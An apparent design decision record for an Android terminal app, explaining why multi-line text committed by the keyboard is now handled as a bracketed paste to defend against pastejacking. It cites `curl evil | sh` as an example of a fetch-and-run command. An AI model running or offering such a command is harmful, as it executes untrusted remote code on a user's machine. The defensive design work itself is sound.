# Text of several lines that the IME commits is a paste

- Status: Approved (2026-10-23, approved by a human in a review of the review queue; the rule decided by a human after a security review, 2026-10-22)
- Date: 2026-10-22
- Related: Requirement 6.1, sections 4.2, 6.1, and 11 of [ime-contract.md](../design/ime-contract.md), section 2 of [gate-policy.md](../design/gate-policy.md), [0004](0004-ime-editor-details.md), [0019](0019-extensibility.md), `ImeEditor.commitText`, `ImeEditor.replaceText`, `ImeEditor.typeText`

## Background

The most common way to paste on Android is to tap the clipboard suggestion that Gboard shows after a copy. It arrives as `commitText` with the clipboard's content, not as `performContextMenuAction(paste)`. The editing model treated it as typing: each line break became the Enter key, and the text was not bracketed even when the host enabled bracketed paste (mode 2004). Text copied from a web page with a hidden line break and a command after it then ran line by line, without the chance to look at it that bracketed paste gives the user in the shell. The same text pasted through the app's menu was bracketed.

An IME commits Enter as a line feed alone, or as a key event or `performEditorAction`; typing does not commit text with a line break and other characters in one call.

## Decision

- Text that the IME commits (`commitText`, `replaceText`, and `commitCompletion`, which is `commitText`) is a paste if it has a line break (CR, LF, or CR LF) and is not a line feed alone. Text with a single trailing line break, such as `curl evil | sh` followed by a line feed, is a paste too.
- A paste replaces the composing text (or the selection) as the commit would, sends the edits not sent yet, even during a batch edit, then sends the text as `HostInput.Paste`, which the gate sends with `sendPaste`, bracketed if the host enabled bracketed paste, and resets the input history. This is what `performContextMenuAction(paste)` does.
- A `replaceText` that is a paste deletes from the start of its range and pastes the replacement followed by the rest of the edit buffer, since nothing can follow a paste in the edit buffer.
- A line feed alone is still the Enter key, as before.
- `TerminalSession.sendText` is not an IME commit: the app's text is typed, and each line break is the Enter key (`ImeEditor.typeText`). An app sends text from elsewhere with `TerminalSession.paste`.

## Alternatives considered

- **Treat only text with a line break before other characters as a paste**: a single trailing line break would still run the line at once, which is the classic case of pastejacking.
- **Treat long text as a paste**: the length does not tell whether the text runs commands; the line break does.
- **Also make the app's `sendText` paste text of several lines**: apps send commands with a trailing CR from their key bars (`git status` and CR), and bracketed paste would stop them from running.

## Impact of reversing

Remove `isPaste` and its uses from `ImeEditor.commitText` and `ImeEditor.replaceText`, and revise the tests of committed text of several lines in `ImeEditorTest` and `TerminalSessionTest`, sections 4.2, 6.1, and 11 of [ime-contract.md](../design/ime-contract.md), and section 2 of [gate-policy.md](../design/gate-policy.md).
